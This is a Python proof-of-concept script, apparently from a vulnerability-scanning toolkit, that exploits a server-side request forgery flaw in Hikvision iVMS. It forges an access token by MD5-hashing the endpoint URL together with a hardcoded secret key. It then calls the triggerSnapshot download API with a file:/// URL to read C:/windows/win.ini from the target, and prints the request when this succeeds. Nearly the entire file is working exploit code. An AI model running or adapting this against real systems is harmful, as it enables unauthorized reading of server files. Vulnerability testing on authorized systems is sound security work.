'''
Function:
    ivms ssrf漏洞
Author:
    spmonkey
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
import requests
import hashlib
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:

    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def token(self, netloc, scheme):
        url = '{}://{}/eps/api/triggerSnapshot/downloadsecretKeyIbuilding'.format(scheme, netloc)
        md5 = hashlib.md5(url.encode()).hexdigest()
        return md5.upper()

    def vuln(self, netloc, token, scheme):
        url = '{}://{}/eps/api/triggerSnapshot/download?token={}&fileUrl=file:///C:/windows/win.ini&fileName=1'.format(scheme, netloc, token)
        try:
            result = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
            if '; for 16-bit app support' in result.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在服务器端请求伪造漏洞\033[0m
                 GET {} HTTP/1.1
                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                return True
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        token = self.token(netloc, scheme)
        if self.vuln(netloc=netloc, token=token, scheme=scheme):
            return self.result_text
        else:
            return False

